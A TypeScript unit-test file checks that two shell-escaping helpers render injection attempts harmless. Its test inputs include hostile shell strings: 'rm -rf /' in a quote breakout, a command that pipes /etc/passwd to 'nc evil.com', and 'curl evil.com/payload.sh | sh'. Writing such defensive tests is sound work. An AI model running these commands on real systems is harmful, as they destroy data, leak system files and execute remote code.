import * as assert from 'assert';
import { shellQuote, neutralizeCommandSubstitution } from "../shellEscaping";
export function runShellQuoteTests() {
    // --- Null / empty handling ---

    it('wraps empty string', () => {
        assert.equal(shellQuote(''), "''");
    });

    it('wraps null', () => {
        assert.equal(shellQuote(null), "''");
    });

    it('wraps undefined', () => {
        assert.equal(shellQuote(undefined), "''");
    });

    // --- Normal values ---

    it('wraps simple path', () => {
        assert.equal(shellQuote('/path/to/file'), "'/path/to/file'");
    });

    it('wraps path with spaces', () => {
        assert.equal(shellQuote('/path/with spaces/file'), "'/path/with spaces/file'");
    });

    it('wraps and escapes single quotes', () => {
        assert.equal(shellQuote("it's here"), "'it'\\''s here'");
    });

    it('wraps value that is only single quotes', () => {
        assert.equal(shellQuote("'"), "''\\'''");
    });

    it('produces a shell-safe token for path with spaces and quotes', () => {
        assert.equal(shellQuote("/path/to/my files/it's here"), "'/path/to/my files/it'\\''s here'");
    });

    // --- Security: values are literal (no expansion) ---

    it('blocks command injection via single-quote breakout', () => {
        const malicious = "'; rm -rf / #";
        const result = shellQuote(malicious);
        assert.equal(result, "''\\''; rm -rf / #'");
    });

    it('blocks command substitution (safe inside single quotes)', () => {
        const malicious = "$(curl evil.com | sh)";
        const result = shellQuote(malicious);
        assert.equal(result, "'$(curl evil.com | sh)'");
    });

    it('blocks backtick substitution (safe inside single quotes)', () => {
        const malicious = "`curl evil.com | sh`";
        const result = shellQuote(malicious);
        assert.equal(result, "'`curl evil.com | sh`'");
    });

    it('handles semicolons and pipes (safe inside single quotes)', () => {
        const malicious = "file; cat /etc/passwd | nc evil.com 1234";
        const result = shellQuote(malicious);
        assert.equal(result, "'file; cat /etc/passwd | nc evil.com 1234'");
    });

    // --- $VAR stays literal (NOT expanded) inside single quotes ---

    it('does not expand $VAR (literal inside single quotes)', () => {
        assert.equal(shellQuote('$HOME/bin'), "'$HOME/bin'");
    });

    it('does not expand ${VAR} (literal inside single quotes)', () => {
        assert.equal(shellQuote('${BUILD_TYPE}'), "'${BUILD_TYPE}'");
    });
}

export function runNeutralizeCommandSubstitutionTests() {
    // --- Null / empty handling ---

    it('returns null/undefined/empty unchanged', () => {
        assert.equal(neutralizeCommandSubstitution(null), null);
        assert.equal(neutralizeCommandSubstitution(undefined), undefined);
        assert.equal(neutralizeCommandSubstitution(''), '');
    });

    // --- Normal values pass through ---

    it('returns simple string unchanged', () => {
        assert.equal(neutralizeCommandSubstitution('--flag=value'), '--flag=value');
    });

    // --- Environment variables are PRESERVED (will expand at runtime) ---

    it('preserves $VAR', () => {
        assert.equal(neutralizeCommandSubstitution('$HOME'), '$HOME');
    });

    it('preserves ${VAR}', () => {
        assert.equal(neutralizeCommandSubstitution('${HOME}'), '${HOME}');
    });

    it('does not escape ${VAR} brace-expansion (regression guard)', () => {
        assert.equal(neutralizeCommandSubstitution('${HOME}/${USER}'), '${HOME}/${USER}');
    });

    it('does not escape bare dollar followed by letter (regression guard)', () => {
        assert.equal(neutralizeCommandSubstitution('$HOME $PATH $1'), '$HOME\\ $PATH\\ $1');
    });

    it('handles real cmake args with env vars', () => {
        assert.equal(
            neutralizeCommandSubstitution('.. -DCMAKE_INSTALL_PREFIX=$INSTALL_DIR -DBUILD_TYPE=${BUILD_TYPE}'),
            '..\\ -DCMAKE_INSTALL_PREFIX=$INSTALL_DIR\\ -DBUILD_TYPE=${BUILD_TYPE}'
        );
    });

    // --- Command substitution is BLOCKED ---

    it('escapes backtick substitution', () => {
        assert.equal(neutralizeCommandSubstitution('`whoami`'), '\\`whoami\\`');
    });

    it('escapes $() substitution', () => {
        assert.equal(neutralizeCommandSubstitution('$(id)'), '\\$\\(id\\)');
    });

    it('escapes nested substitution', () => {
        assert.equal(
            neutralizeCommandSubstitution('$(echo `whoami`)'),
            '\\$\\(echo\\ \\`whoami\\`\\)'
        );
    });

    it('blocks arithmetic expansion $((...))', () => {
        assert.equal(neutralizeCommandSubstitution('$((1+2))'), '\\$\\(\\(1+2\\)\\)');
    });

    it('escapes all $() occurrences when multiple are present', () => {
        assert.equal(
            neutralizeCommandSubstitution('$(a) $(b)'),
            '\\$\\(a\\)\\ \\$\\(b\\)'
        );
    });

    // --- Shell metacharacters are ESCAPED ---

    it('escapes semicolons', () => {
        assert.equal(neutralizeCommandSubstitution('echo hello;whoami'), 'echo\\ hello\\;whoami');
    });

    it('escapes redirect operators', () => {
        assert.equal(neutralizeCommandSubstitution('cat file > /tmp/out'), 'cat\\ file\\ \\>\\ /tmp/out');
        assert.equal(neutralizeCommandSubstitution('cmd < input'), 'cmd\\ \\<\\ input');
    });

    it('escapes ampersand', () => {
        assert.equal(neutralizeCommandSubstitution('cmd1 & cmd2'), 'cmd1\\ \\&\\ cmd2');
        assert.equal(neutralizeCommandSubstitution('cmd1 && cmd2'), 'cmd1\\ \\&\\&\\ cmd2');
    });

    it('escapes hash comment character', () => {
        assert.equal(neutralizeCommandSubstitution('value # comment'), 'value\\ \\#\\ comment');
    });

    it('escapes standalone parentheses', () => {
        assert.equal(neutralizeCommandSubstitution('(cmd)'), '\\(cmd\\)');
    });

    it('escapes pipes', () => {
        assert.equal(neutralizeCommandSubstitution('cmd1|cmd2'), 'cmd1\\|cmd2');
    });

    // --- Quotes are ESCAPED (prevents quote-breakout attacks) ---

    it('escapes single quotes', () => {
        assert.equal(neutralizeCommandSubstitution("it's here"), "it\\'s\\ here");
    });

    it('escapes double quotes', () => {
        assert.equal(neutralizeCommandSubstitution('"hello"'), '\\"hello\\"');
    });

    // --- Whitespace is ESCAPED (keeps value as one argument) ---

    it('escapes spaces', () => {
        assert.equal(neutralizeCommandSubstitution('hello world'), 'hello\\ world');
    });

    it('escapes tabs', () => {
        assert.equal(neutralizeCommandSubstitution('col1\tcol2'), 'col1\\\tcol2');
    });

    // --- Backslashes are ESCAPED ---

    it('escapes existing backslashes', () => {
        assert.equal(neutralizeCommandSubstitution('a\\b'), 'a\\\\b');
    });

    it('escapes existing backslashes before backticks to prevent backslash consumption', () => {
        assert.equal(neutralizeCommandSubstitution('\\`cmd`'), '\\\\\\`cmd\\`');
    });

    // --- Newlines are STRIPPED (they act as command separators) ---

    it('strips newline', () => {
        assert.equal(neutralizeCommandSubstitution('a\nb'), 'ab');
    });

    it('strips carriage return', () => {
        assert.equal(neutralizeCommandSubstitution('a\rb'), 'ab');
    });

    it('strips carriage return + newline', () => {
        assert.equal(neutralizeCommandSubstitution('a\r\nb'), 'ab');
    });

    // --- Mixed / real-world scenarios ---

    it('handles mixed content preserving env vars', () => {
        assert.equal(
            neutralizeCommandSubstitution('-DFOO=$(curl evil.com) -DBAR=${ENV_VAR}'),
            '-DFOO=\\$\\(curl\\ evil.com\\)\\ -DBAR=${ENV_VAR}'
        );
    });

    it('blocks real attack payload', () => {
        const payload = '.. -DFOO=$(curl http://evil.com/payload.sh | sh)';
        const result = neutralizeCommandSubstitution(payload);
        assert.equal(result, '..\\ -DFOO=\\$\\(curl\\ http://evil.com/payload.sh\\ \\|\\ sh\\)');
    });

    it('handles multiple meta-characters combined', () => {
        assert.equal(
            neutralizeCommandSubstitution('a|b;c&d<e>f#g'),
            'a\\|b\\;c\\&d\\<e\\>f\\#g'
        );
    });

    it('double-escapes already-escaped input (not idempotent by design)', () => {
        assert.equal(neutralizeCommandSubstitution('\\$\\(cmd\\)'), '\\\\$\\\\\\(cmd\\\\\\)');
    });

    it('escapes $() inside double quotes', () => {
        assert.equal(neutralizeCommandSubstitution('"$(cmd)"'), '\\"\\$\\(cmd\\)\\"');
    });

    // --- Security: quote-breakout attacks are BLOCKED ---

    it('blocks balanced single-quote breakout with semicolon', () => {
        // Attacker tries: '; whoami; echo '
        // If developer wraps in quotes: program '' ; whoami ; echo ''  → INJECTION!
        // With fix: quotes are escaped, so the shell sees literal characters
        assert.equal(
            neutralizeCommandSubstitution("'; whoami; echo '"),
            "\\'\\;\\ whoami\\;\\ echo\\ \\'"
        );
    });

    it('blocks balanced single-quote breakout with && chaining', () => {
        assert.equal(
            neutralizeCommandSubstitution("' && echo INJECTED && echo '"),
            "\\'\\ \\&\\&\\ echo\\ INJECTED\\ \\&\\&\\ echo\\ \\'"
        );
    });

    it('blocks balanced single-quote breakout with pipe', () => {
        assert.equal(
            neutralizeCommandSubstitution("' | echo INJECTED #'"),
            "\\'\\ \\|\\ echo\\ INJECTED\\ \\#\\'"
        );
    });

    it('handles apostrophe with $()', () => {
        assert.equal(
            neutralizeCommandSubstitution("it's $(cmd)"),
            "it\\'s\\ \\$\\(cmd\\)"
        );
    });
}
